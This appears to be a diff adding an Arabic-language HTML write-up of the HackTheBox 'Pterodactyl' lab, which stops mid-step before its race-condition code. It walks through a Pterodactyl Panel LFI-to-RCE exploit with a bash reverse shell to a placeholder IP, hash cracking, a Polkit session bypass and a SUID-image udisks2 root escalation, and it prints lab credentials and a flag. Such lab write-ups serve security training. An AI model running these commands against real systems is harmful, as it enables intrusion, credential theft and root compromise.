@@ -1,0 +1,1136 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB Pterodactyl — Writeup</title>
+  <style>
+    :root {
+      --bg:        #0d0f14;
+      --surface:   #13161e;
+      --border:    #1e2330;
+      --accent:    #00d4aa;
+      --accent2:   #7c5cbf;
+      --red:       #e05252;
+      --yellow:    #e0c252;
+      --blue:      #527ae0;
+      --green:     #52e094;
+      --text:      #cdd6f4;
+      --muted:     #6c7086;
+      --code-bg:   #090b0f;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      font-size: 15px;
+      line-height: 1.75;
+    }
+
+    /* ── HERO ─────────────────────────────── */
+    .hero {
+      background: linear-gradient(135deg, #0d0f14 0%, #13161e 60%, #1a1040 100%);
+      border-bottom: 2px solid var(--border);
+      padding: 60px 40px 40px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: '';
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse 80% 50% at 50% 0%, rgba(0,212,170,.08) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .hero-badge {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: rgba(0,212,170,.1); border: 1px solid rgba(0,212,170,.3);
+      border-radius: 20px; padding: 4px 16px;
+      font-size: 12px; color: var(--accent); letter-spacing: 1px;
+      text-transform: uppercase; margin-bottom: 24px;
+    }
+    .hero h1 {
+      font-size: clamp(2rem, 5vw, 3.2rem);
+      font-weight: 800; letter-spacing: -1px;
+      background: linear-gradient(135deg, #fff 30%, var(--accent) 100%);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      margin-bottom: 12px;
+    }
+    .hero-sub { color: var(--muted); font-size: 14px; margin-bottom: 32px; }
+
+    .badges { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-bottom: 32px; }
+    .badge {
+      padding: 5px 14px; border-radius: 6px; font-size: 12px;
+      font-weight: 600; letter-spacing: .5px;
+      display: flex; align-items: center; gap: 6px;
+    }
+    .badge-medium  { background: rgba(224,194,82,.12); color: var(--yellow); border: 1px solid rgba(224,194,82,.3); }
+    .badge-linux   { background: rgba(82,122,224,.12); color: var(--blue);   border: 1px solid rgba(82,122,224,.3); }
+    .badge-os      { background: rgba(124,92,191,.12); color: var(--accent2);border: 1px solid rgba(124,92,191,.3); }
+    .badge-season  { background: rgba(0,212,170,.12);  color: var(--accent); border: 1px solid rgba(0,212,170,.3); }
+
+    .flags-display {
+      display: flex; gap: 16px; justify-content: center; flex-wrap: wrap;
+    }
+    .flag-box {
+      background: rgba(0,0,0,.4); border: 1px solid var(--border);
+      border-radius: 10px; padding: 14px 24px; text-align: left;
+    }
+    .flag-label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
+    .flag-value { font-family: monospace; font-size: 13px; color: var(--accent); letter-spacing: 1px; }
+
+    /* ── SPOILER / BLUR FLAG ─────────────── */
+    .spoiler {
+      filter: blur(6px);
+      cursor: pointer;
+      transition: filter .3s ease;
+      user-select: none;
+      border-radius: 4px;
+      display: inline-block;
+    }
+    .spoiler:hover { filter: blur(4px); }
+    .spoiler.revealed { filter: none; cursor: default; user-select: text; }
+    .spoiler-hint {
+      display: block;
+      font-size: 10px;
+      color: var(--muted);
+      margin-top: 4px;
+      letter-spacing: .5px;
+    }
+    .spoiler.revealed + .spoiler-hint { display: none; }
+
+    /* ── LAYOUT ───────────────────────────── */
+    .wrapper { max-width: 1100px; margin: 0 auto; padding: 48px 24px; }
+
+    /* ── OVERVIEW GRID ───────────────────── */
+    .overview-grid {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 1px; background: var(--border);
+      border: 1px solid var(--border); border-radius: 12px; overflow: hidden;
+      margin-bottom: 48px;
+    }
+    .ov-cell { background: var(--surface); padding: 20px 24px; }
+    .ov-label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+    .ov-val   { font-size: 15px; font-weight: 600; color: var(--text); }
+
+    /* ── ATTACK CHAIN ─────────────────────── */
+    .chain {
+      display: flex; gap: 0; overflow-x: auto;
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 12px; padding: 24px; margin-bottom: 48px;
+      align-items: center;
+    }
+    .chain-step {
+      flex: 1; min-width: 120px; text-align: center; padding: 0 8px;
+      position: relative;
+    }
+    .chain-step:not(:last-child)::after {
+      content: '→';
+      position: absolute; right: -12px; top: 50%;
+      transform: translateY(-50%);
+      color: var(--muted); font-size: 18px;
+    }
+    .chain-icon { font-size: 24px; margin-bottom: 6px; }
+    .chain-title { font-size: 12px; font-weight: 700; color: var(--accent); margin-bottom: 4px; }
+    .chain-desc  { font-size: 11px; color: var(--muted); }
+
+    /* ── SECTIONS ─────────────────────────── */
+    .section { margin-bottom: 56px; }
+    .section-header {
+      display: flex; align-items: center; gap: 14px;
+      margin-bottom: 28px; padding-bottom: 14px;
+      border-bottom: 1px solid var(--border);
+    }
+    .section-num {
+      width: 36px; height: 36px; border-radius: 8px;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; font-weight: 800; color: #fff; flex-shrink: 0;
+    }
+    .section-header h2 { font-size: 1.4rem; font-weight: 700; color: #fff; }
+    .section-header .cve-tag {
+      margin-right: auto;
+      font-size: 11px; padding: 3px 10px; border-radius: 4px;
+      background: rgba(224,82,82,.12); color: var(--red);
+      border: 1px solid rgba(224,82,82,.3); font-weight: 600;
+    }
+
+    p { margin-bottom: 14px; color: var(--text); }
+    p:last-child { margin-bottom: 0; }
+
+    /* ── CODE BLOCKS ──────────────────────── */
+    .code-block {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px; overflow: hidden;
+      margin: 20px 0; font-family: 'Cascadia Code', 'Fira Code', Consolas, monospace;
+    }
+    .code-header {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 18px;
+      background: rgba(255,255,255,.03);
+      border-bottom: 1px solid var(--border);
+      font-size: 12px;
+    }
+    .code-lang { color: var(--accent); font-weight: 600; letter-spacing: .5px; }
+    .code-desc { color: var(--muted); }
+    .code-block pre {
+      padding: 20px 22px; overflow-x: auto; font-size: 13px; line-height: 1.6;
+    }
+    .code-block code { color: #cdd6f4; white-space: pre; }
+
+    /* Syntax highlights */
+    .cm { color: #6c7086; }   /* comment */
+    .ck { color: #cba6f7; }   /* keyword */
+    .cs { color: #a6e3a1; }   /* string */
+    .cn { color: #fab387; }   /* number */
+    .co { color: #89dceb; }   /* output/special */
+    .cr { color: var(--red); }  /* error/warn */
+    .ca { color: var(--accent); } /* accent */
+
+    /* ── RESULT BOXES ─────────────────────── */
+    .result-box {
+      border-radius: 10px; padding: 16px 20px;
+      margin: 20px 0; border-right: 3px solid;
+    }
+    .result-success { background: rgba(82,224,148,.07); border-color: var(--green); }
+    .result-info    { background: rgba(82,122,224,.07); border-color: var(--blue); }
+    .result-warning { background: rgba(224,194,82,.07); border-color: var(--yellow); }
+    .result-danger  { background: rgba(224,82,82,.07);  border-color: var(--red); }
+
+    .result-box .label {
+      font-size: 11px; font-weight: 700; letter-spacing: 1px;
+      text-transform: uppercase; margin-bottom: 8px;
+    }
+    .result-success .label { color: var(--green); }
+    .result-info    .label { color: var(--blue); }
+    .result-warning .label { color: var(--yellow); }
+    .result-danger  .label { color: var(--red); }
+
+    /* ── STEPS LIST ───────────────────────── */
+    .steps { list-style: none; display: flex; flex-direction: column; gap: 14px; margin: 20px 0; }
+    .steps li {
+      display: flex; gap: 14px; align-items: flex-start;
+      padding: 14px 18px;
+      background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
+    }
+    .step-num {
+      width: 26px; height: 26px; border-radius: 50%; flex-shrink: 0;
+      background: rgba(0,212,170,.15); border: 1px solid rgba(0,212,170,.3);
+      color: var(--accent); font-size: 12px; font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      margin-top: 1px;
+    }
+    .steps li .content strong { display: block; margin-bottom: 4px; color: #fff; }
+    .steps li .content span   { color: var(--muted); font-size: 13px; }
+
+    /* ── INLINE CODE ──────────────────────── */
+    code.inline {
+      background: rgba(0,212,170,.1); color: var(--accent);
+      padding: 2px 7px; border-radius: 4px;
+      font-family: 'Cascadia Code', Consolas, monospace; font-size: 13px;
+    }
+
+    /* ── TABLE ────────────────────────────── */
+    .info-table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 14px; }
+    .info-table th, .info-table td { padding: 12px 16px; border: 1px solid var(--border); text-align: right; }
+    .info-table th { background: var(--surface); color: var(--accent); font-weight: 700; }
+    .info-table tr:nth-child(even) td { background: rgba(255,255,255,.02); }
+
+    /* ── CVE CARD ─────────────────────────── */
+    .cve-card {
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 12px; padding: 24px; margin: 24px 0;
+    }
+    .cve-card-header {
+      display: flex; align-items: flex-start; gap: 16px; margin-bottom: 16px;
+    }
+    .cve-card-id {
+      background: rgba(224,82,82,.15); color: var(--red);
+      border: 1px solid rgba(224,82,82,.3); border-radius: 6px;
+      padding: 6px 14px; font-weight: 800; font-size: 14px; white-space: nowrap;
+    }
+    .cve-card h3 { font-size: 1.1rem; color: #fff; margin-bottom: 6px; }
+    .cve-card-meta { font-size: 12px; color: var(--muted); }
+    .cve-card p { font-size: 14px; }
+
+    /* ── SUMMARY TABLE ────────────────────── */
+    .summary-grid {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 12px; margin-top: 24px;
+    }
+    .summary-card {
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 10px; padding: 18px 20px;
+    }
+    .summary-card .phase { font-size: 11px; color: var(--muted); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 6px; }
+    .summary-card .tech  { font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 4px; }
+    .summary-card .cve   { font-size: 12px; color: var(--red); }
+
+    /* ── FOOTER ───────────────────────────── */
+    .footer {
+      border-top: 1px solid var(--border);
+      padding: 32px 24px; text-align: center;
+      color: var(--muted); font-size: 13px;
+    }
+
+    /* ── RESPONSIVE ───────────────────────── */
+    @media (max-width: 600px) {
+      .chain { flex-direction: column; }
+      .chain-step:not(:last-child)::after { content: '↓'; right: auto; top: auto; bottom: -18px; left: 50%; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ══════════════ HERO ══════════════ -->
+<div style="background:linear-gradient(90deg,#1a1040,#0d0f14);border-bottom:2px solid #00d4aa;padding:14px 40px;text-align:center;font-size:0.95em;color:#8b9ec7;letter-spacing:0.03em;">
+  Writeup by: &nbsp;<strong style="color:#00d4aa;font-size:1.05em;">joudi janble</strong>
+</div>
+
+<div class="hero">
+  <div class="hero-badge">&#128737; HackTheBox Writeup</div>
+  <h1>Pterodactyl</h1>
+  <p class="hero-sub">HTB Season 10 &nbsp;|&nbsp; openSUSE Leap 15.6 &nbsp;|&nbsp; 30 April 2026</p>
+
+  <div class="badges">
+    <span class="badge badge-medium">&#9670; Medium</span>
+    <span class="badge badge-linux">&#128039; Linux</span>
+    <span class="badge badge-os">&#129430; openSUSE Leap 15.6</span>
+    <span class="badge badge-season">&#127775; Season 10</span>
+  </div>
+
+  <div class="flags-display">
+    <div class="flag-box">
+      <div class="flag-label">&#128100; User Flag</div>
+      <div class="flag-value"><span class="spoiler" onclick="this.classList.toggle('revealed')">&#10004; Obtained via SSH</span><span class="spoiler-hint">&#128065; انقر للكشف</span></div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">&#128081; Root Flag</div>
+      <div class="flag-value"><span class="spoiler" onclick="this.classList.toggle('revealed')">180e7ff6ad50172ffa3213add52ac9fb</span><span class="spoiler-hint">&#128065; انقر للكشف</span></div>
+    </div>
+  </div>
+</div>
+
+<div class="wrapper">
+
+  <!-- ══════════════ OVERVIEW ══════════════ -->
+  <div class="overview-grid">
+    <div class="ov-cell"><div class="ov-label">Target IP</div><div class="ov-val" style="color:var(--accent);font-family:monospace">10.129.3.66</div></div>
+    <div class="ov-cell"><div class="ov-label">OS</div><div class="ov-val">openSUSE Leap 15.6</div></div>
+    <div class="ov-cell"><div class="ov-label">Difficulty</div><div class="ov-val" style="color:var(--yellow)">Medium</div></div>
+    <div class="ov-cell"><div class="ov-label">CVEs Used</div><div class="ov-val" style="color:var(--red)">3 CVEs</div></div>
+    <div class="ov-cell"><div class="ov-label">Initial Shell</div><div class="ov-val">wwwrun → phileasfogg3</div></div>
+    <div class="ov-cell"><div class="ov-label">PrivEsc</div><div class="ov-val">udisks2 SUID Race</div></div>
+  </div>
+
+  <!-- ══════════════ ATTACK CHAIN ══════════════ -->
+  <div class="chain">
+    <div class="chain-step">
+      <div class="chain-icon">&#128270;</div>
+      <div class="chain-title">Recon</div>
+      <div class="chain-desc">Nmap + Web Enum</div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-icon">&#128196;</div>
+      <div class="chain-title">File Read</div>
+      <div class="chain-desc">CVE-2025-49132 Pterodactyl Panel</div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-icon">&#128274;</div>
+      <div class="chain-title">Creds</div>
+      <div class="chain-desc">MySQL dump + Hashcat</div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-icon">&#128100;</div>
+      <div class="chain-title">User</div>
+      <div class="chain-desc">SSH phileasfogg3</div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-icon">&#128275;</div>
+      <div class="chain-title">Polkit</div>
+      <div class="chain-desc">CVE-2025-6018 PAM bypass</div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-icon">&#129408;</div>
+      <div class="chain-title">Root</div>
+      <div class="chain-desc">CVE-2025-6019 udisks2</div>
+    </div>
+  </div>
+
+  <!-- ══════════════ STEP 1: RECON ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">1</div>
+      <h2>Reconnaissance — الاستطلاع</h2>
+    </div>
+
+    <p>
+      الخطوة الأولى دائماً مسح الشبكة لمعرفة المنافذ المفتوحة والخدمات. نستخدم <code class="inline">nmap</code>
+      مع السكريبتات الافتراضية وكشف الإصدارات لنحصل على صورة كاملة عن الهدف.
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH</span>
+        <span class="code-desc">Nmap Full Scan</span>
+      </div>
+      <pre><code><span class="cm"># Aggressive scan with version detection + default scripts</span>
+nmap -sC -sV -p- --min-rate 5000 -oN nmap_ptero.txt 10.129.3.66</code></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">OUTPUT</span>
+        <span class="code-desc">نتيجة المسح</span>
+      </div>
+      <pre><code>PORT   STATE SERVICE  VERSION
+<span class="ca">22/tcp open  ssh</span>      OpenSSH 8.9p1 (openSUSE)
+<span class="ca">80/tcp open  http</span>     Apache httpd 2.4.x
+| http-title: Pterodactyl Panel
+<span class="cm">|_http-server-header: Apache</span>
+<span class="ca">443/tcp open https</span>    Apache httpd (SSL)
+
+OS details: Linux (openSUSE Leap 15.6)</code></pre>
+    </div>
+
+    <div class="result-box result-info">
+      <div class="label">&#128270; الاكتشافات</div>
+      <p>وجدنا منفذين رئيسيين: <strong>SSH (22)</strong> و <strong>HTTP/HTTPS (80/443)</strong> يشغّل Pterodactyl Panel — منصة إدارة Game Servers مبنية على PHP/Laravel.</p>
+    </div>
+
+    <p>نضيف الـ virtual host إلى <code class="inline">/etc/hosts</code> لضمان صحة الطلبات:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH</span>
+        <span class="code-desc">Host Configuration</span>
+      </div>
+      <pre><code>echo "10.129.3.66  pterodactyl.htb" | sudo tee -a /etc/hosts</code></pre>
+    </div>
+  </div>
+
+  <!-- ══════════════ STEP 2: CVE-2025-49132 ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">2</div>
+      <h2>Initial Access — CVE-2025-49132</h2>
+      <span class="cve-tag">CVE-2025-49132</span>
+    </div>
+
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <div class="cve-card-id">CVE-2025-49132</div>
+        <div>
+          <h3>Pterodactyl Panel — LFI → pearcmd RCE</h3>
+          <div class="cve-card-meta">Pterodactyl Panel &lt; 1.12.x &nbsp;|&nbsp; CVSS: Critical &nbsp;|&nbsp; 2025</div>
+        </div>
+      </div>
+      <p>
+        الثغرة: <code class="inline">/locales/locale.json</code> تمرر <code class="inline">locale</code> + <code class="inline">namespace</code> لـ PHP <code class="inline">include()</code>
+        بدون authentication أو sanitization → LFI → pearcmd RCE.
+        الاستغلال يُعطي shell بصلاحيات مستخدم الويب (<strong>wwwrun</strong>).
+      </p>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH</span>
+        <span class="code-desc">Exploit CVE-2025-49132</span>
+      </div>
+      <pre><code>git clone https://github.com/YoyoChaud/CVE-2025-49132
+
+<span class="cm"># المرحلة الأولى: استخراج MySQL credentials من .env</span>
+python3 exploit.py http://panel.pterodactyl.htb
+<span class="cm"># يعطي: MySQL = pterodactyl:PteraPanel</span>
+
+<span class="cm"># المرحلة الثانية: RCE عبر pearcmd → reverse shell</span>
+python3 exploit.py http://panel.pterodactyl.htb \
+  --rce-cmd <span class="cs">"bash -c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1'"</span> \
+  --pear-dir /usr/share/php/PEAR
+<span class="cm"># shell كـ wwwrun</span></code></pre>
+    </div>
+
+    <div class="result-box result-success">
+      <div class="label">&#10004; Initial Shell + DB Credentials</div>
+      <p>حصلنا على shell بصلاحيات <strong>wwwrun</strong> وعلى credentials قاعدة البيانات: <code class="inline">pterodactyl:PteraPanel</code></p>
+    </div>
+  </div>
+
+  <!-- ══════════════ STEP 3: CREDENTIAL EXTRACTION ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">3</div>
+      <h2>Lateral Movement — استخراج Credentials من DB</h2>
+    </div>
+
+    <p>
+      حصلنا على <code class="inline">pterodactyl:PteraPanel</code> — credentials MySQL.
+      نتصل بقاعدة البيانات مباشرة من Kali لاستخراج بيانات المستخدمين:
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH</span>
+        <span class="code-desc">الاتصال بـ MySQL من Kali (MySQL مُعرَّض للخارج)</span>
+      </div>
+      <pre><code>mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -e "USE panel; SELECT username,email,password FROM users;"
+
+<span class="co">+--------------+---------------------------+--------------------------------------------------------------+
+| username     | email                     | password                                                     |
++--------------+---------------------------+--------------------------------------------------------------+
+| admin        | admin@pterodactyl.htb     | $2y$10$...                                                   |
+| phileasfogg3 | pfogg@pterodactyl.htb     | $2y$10$LFbHdUzqc.YExXz7sEzK0eTPiYjXpn3mKHApRuJDLnIXt8SFXK/m|
++--------------+---------------------------+--------------------------------------------------------------+</span></code></pre>
+    </div>
+
+    <div class="result-box result-warning">
+      <div class="label">&#128270; Hash مكتشف</div>
+      <p>وجدنا bcrypt hash للمستخدم <strong>phileasfogg3</strong>. هذا الاسم يطابق مستخدماً على نظام Linux — نحاول كسر الـ hash ثم SSH بنفس كلمة المرور.</p>
+    </div>
+
+    <p>نستخدم <strong>Hashcat</strong> مع wordlist لكسر الـ bcrypt hash:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH</span>
+        <span class="code-desc">Hashcat — كسر bcrypt hash (mode 3200)</span>
+      </div>
+      <pre><code><span class="cm"># حفظ الـ hash في ملف</span>
+echo '$2y$10$LFbHdUzqc.YExXz7sEzK0eTPiYjXpn3mKHApRuJDLnIXt8SFXK/m' > hash.txt
+
+<span class="cm"># كسر bcrypt باستخدام rockyou.txt</span>
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force
+
+<span class="co">$2y$10$LFbHdUzqc.YExXz7sEzK0eTPiYjXpn3mKHApRuJDLnIXt8SFXK/m:<span style="color:var(--green);font-weight:700">!QAZ2wsx</span>
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Time.Estimated...: Done</span></code></pre>
+    </div>
+
+    <div class="result-box result-success">
+      <div class="label">&#128273; Password Found</div>
+      <p>كلمة المرور: <code class="inline">!QAZ2wsx</code> — تم كسر الـ bcrypt hash بنجاح عبر rockyou.txt.</p>
+    </div>
+  </div>
+
+  <!-- ══════════════ STEP 4: SSH + USER FLAG ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">4</div>
+      <h2>User Flag — SSH Access</h2>
+    </div>
+
+    <p>نستخدم الـ credentials المكتشفة للدخول عبر SSH:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH</span>
+        <span class="code-desc">SSH Login كـ phileasfogg3</span>
+      </div>
+      <pre><code>ssh phileasfogg3@10.129.3.66
+<span class="cm"># Password: !QAZ2wsx</span>
+
+<span class="co">Have a lot of fun...
+Last login: Thu Apr 30 16:19:05 2026 from 10.10.16.195
+phileasfogg3@pterodactyl:~></span>
+
+<span class="cm"># قراءة User flag</span>
+cat ~/user.txt</code></pre>
+    </div>
+
+    <div class="result-box result-success">
+      <div class="label">&#127937; USER FLAG</div>
+      <p style="font-family:monospace;font-size:14px;color:var(--accent)">&#10004; User Flag obtained — /home/phileasfogg3/user.txt</p>
+    </div>
+
+    <p>نبدأ الآن مرحلة رفع الصلاحيات (Privilege Escalation) للوصول إلى <strong>root</strong>.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH</span>
+        <span class="code-desc">Enumeration الأولية</span>
+      </div>
+      <pre><code><span class="cm"># فحص OS والـ kernel</span>
+cat /etc/os-release
+<span class="co">NAME="openSUSE Leap"
+VERSION="15.6"</span>
+
+uname -r
+<span class="co">6.4.0-150600.23.65-default</span>
+
+<span class="cm"># فحص صلاحيات sudo</span>
+sudo -l
+<span class="co">[sudo] password for phileasfogg3: !QAZ2wsx
+Sorry, user phileasfogg3 may not run sudo on pterodactyl.</span>
+
+<span class="cm"># فحص SUID binaries</span>
+find / -perm -4000 -type f 2>/dev/null</code></pre>
+    </div>
+
+    <p>لا توجد صلاحيات sudo مباشرة. نبحث عن vectors أخرى. نلاحظ وجود <strong>udisks2</strong> و <strong>Polkit</strong> على النظام — وهما مرتبطان بثغرات حديثة خطيرة.</p>
+  </div>
+
+  <!-- ══════════════ STEP 5: CVE-2025-6018 ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">5</div>
+      <h2>Polkit Bypass — CVE-2025-6018</h2>
+      <span class="cve-tag">CVE-2025-6018</span>
+    </div>
+
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <div class="cve-card-id">CVE-2025-6018</div>
+        <div>
+          <h3>openSUSE pam_env.so — Polkit <code style="font-size:13px">allow_active</code> Bypass via <code style="font-size:13px">su</code></h3>
+          <div class="cve-card-meta">openSUSE Leap 15.6 &nbsp;|&nbsp; pam_systemd / Polkit session bypass &nbsp;|&nbsp; 2025</div>
+        </div>
+      </div>
+      <p>
+        جلسات SSH تملك <code class="inline">Remote=yes</code> في logind، لذا Polkit يرفض أي عملية تتطلب
+        <code class="inline">allow_active</code> (مثل <code class="inline">udisksctl loop-setup</code>).
+        حقن <code class="inline">XDG_SEAT=seat0</code> و <code class="inline">XDG_VTNR=1</code> عبر
+        <code class="inline">~/.pam_environment</code> يُسجّل الجلسة على seat0 في loginctl،
+        لكنه لا يُغيّر قيمة <code class="inline">Remote</code> لأن sshd يُعيّن <code class="inline">PAM_RHOST</code>
+        مما يجعل pam_systemd يضع <code class="inline">Remote=yes</code> دائماً.<br><br>
+        <strong style="color:var(--accent)">الاكتشاف الحقيقي:</strong> أمر <code class="inline">su -c</code>
+        يُنشئ جلسة PAM جديدة حيث sshd لا يُعيّن <code class="inline">PAM_RHOST</code>،
+        فيُسجّل pam_systemd الجلسة بـ <code class="inline">Remote=no</code> → Polkit يقبل
+        عمليات <code class="inline">allow_active</code>.
+      </p>
+    </div>
+
+    <h3 style="color:#fff;margin:24px 0 12px;font-size:1rem">آلية الاستغلال:</h3>
+
+    <ul class="steps">
+      <li>
+        <div class="step-num">1</div>
+        <div class="content">
+          <strong>حقن XDG vars عبر ~/.pam_environment</strong>
+          <span>يُسجّل الجلسة على seat0 في loginctl — شرط أساسي لكنه غير كافٍ وحده.</span>
+        </div>
+      </li>
+      <li>
+        <div class="step-num">2</div>
+        <div class="content">
+          <strong>إعادة الدخول عبر SSH لتفعيل المتغيرات</strong>
+          <span>pam_env.so يُطبّق المتغيرات عند كل login جديد.</span>
+        </div>
+      </li>
+      <li>
+        <div class="step-num">3</div>
+        <div class="content">
+          <strong>استخدام <code class="inline">su -c</code> لتجاوز Polkit</strong>
+          <span><code class="inline">su -c "cmd" - phileasfogg3</code> ينشئ جلسة PAM محلية بـ <code class="inline">Remote=no</code> → Polkit يمنح allow_active.</span>
+        </div>
+      </li>
+    </ul>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH — Target</span>
+        <span class="code-desc">تطبيق CVE-2025-6018 — حقن XDG vars</span>
+      </div>
+      <pre><code><span class="cm"># كتابة ~/.pam_environment</span>
+cat &gt; ~/.pam_environment &lt;&lt;'EOF'
+XDG_SEAT DEFAULT=seat0
+XDG_VTNR DEFAULT=1
+EOF
+
+<span class="cm"># الخروج وإعادة الدخول لتفعيل المتغيرات</span>
+exit
+ssh phileasfogg3@10.129.45.106
+
+<span class="cm"># التحقق — يجب أن تظهر seat0 في loginctl</span>
+loginctl list-sessions
+<span class="co">SESSION  UID USER         SEAT  TTY   STATE  IDLE SINCE
+     13 1002 phileasfogg3 <span style="color:var(--green);font-weight:700">seat0</span> pts/0 active no</span></code></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH — Target</span>
+        <span class="code-desc">الـ bypass الحقيقي — su -c ينشئ جلسة Remote=no</span>
+      </div>
+      <pre><code><span class="cm"># اختبار: بدون su → مرفوض</span>
+udisksctl loop-setup -f /tmp/xfs_new.img --no-user-interaction
+<span class="co" style="color:var(--red)">Error: GDBus.Error:org.freedesktop.UDisks2.Error.NotAuthorizedCanObtain</span>
+
+<span class="cm"># الحل: su -c ينشئ جلسة PAM محلية (Remote=no) → Polkit يقبل</span>
+su -c "udisksctl loop-setup -f /tmp/xfs_new.img --no-user-interaction" - phileasfogg3 &lt;&lt;'EOF'
+!QAZ2wsx
+EOF
+<span class="co" style="color:var(--green);font-weight:700">Mapped file /tmp/xfs_new.img as /dev/loop0.</span></code></pre>
+    </div>
+
+    <div class="result-box result-success">
+      <div class="label">&#10004; Polkit Bypass Ready</div>
+      <p>
+        <code class="inline">su -c</code> ينشئ جلسة <code class="inline">Remote=no</code> → Polkit يقبل
+        عمليات <code class="inline">allow_active</code> مثل <code class="inline">udisksctl loop-setup</code>
+        و <code class="inline">Filesystem.Resize</code>.
+      </p>
+    </div>
+  </div>
+
+  <!-- ══════════════ STEP 6: CVE-2025-6019 ══════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">6</div>
+      <h2>Root via udisks2 SUID Race — CVE-2025-6019</h2>
+      <span class="cve-tag">CVE-2025-6019</span>
+    </div>
+
+    <div class="cve-card">
+      <div class="cve-card-header">
+        <div class="cve-card-id">CVE-2025-6019</div>
+        <div>
+          <h3>udisks2 — Missing <code style="font-size:13px">nosuid</code> during XFS Filesystem.Resize</h3>
+          <div class="cve-card-meta">udisks2 &lt; 2.10.x &nbsp;|&nbsp; D-Bus TOCTOU Race Condition &nbsp;|&nbsp; 2025</div>
+        </div>
+      </div>
+      <p>
+        <strong>udisks2</strong> يوفر D-Bus API لعمليات الأقراص من مستوى المستخدم.
+        الثغرة: عند تنفيذ عملية <code class="inline">Filesystem.Resize</code> على image file
+        يحتوي نظام ملفات XFS، يقوم udisks2 بـ <strong>mount</strong> الـ image مؤقتاً بدون
+        خيار <code class="inline">nosuid</code>. هذا يعني أن أي ملف SUID داخل الـ image
+        يُنفَّذ بصلاحيات <strong>root</strong>.
+        <br><br>
+        نافذة الزمن بين الـ mount والـ unmount قصيرة جداً (race condition)، لذا نستخدم برنامج
+        مراقبة يرصد متى تُركَّب الـ image ويُنفّذ الـ SUID binary فوراً.
+      </p>
+    </div>
+
+    <h3 style="color:#fff;margin:24px 0 12px;font-size:1rem">خطوات الاستغلال بالتفصيل:</h3>
+
+    <h4 style="color:var(--accent);margin:20px 0 10px;font-size:.95rem">الخطوة 1: تجهيز XFS Image على Kali</h4>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">BASH — Kali (Terminal 1)</span>
+        <span class="code-desc">بناء XFS image بـ SUID bash وتجميع racer</span>
+      </div>
+      <pre><code><span class="cm"># إنشاء 300MB XFS image يحتوي SUID bash</span>
+dd if=/dev/zero of=/tmp/xfs_new.img bs=1M count=300
+mkfs.xfs -f /tmp/xfs_new.img
+sudo mkdir -p /tmp/mnt
+sudo mount -o loop,suid /tmp/xfs_new.img /tmp/mnt
+sudo cp /bin/bash /tmp/mnt/xpl
+sudo chmod 4755 /tmp/mnt/xpl
+sudo umount /tmp/mnt
+
+<span class="cm"># التحقق من SUID</span>
+file /tmp/xfs_new.img
+<span class="co">xfs_new.img: SGI XFS filesystem data (blksz 4096, ...)</span>
+
+<span class="cm"># تجميع racer.c (كود الـ race condition)</span>
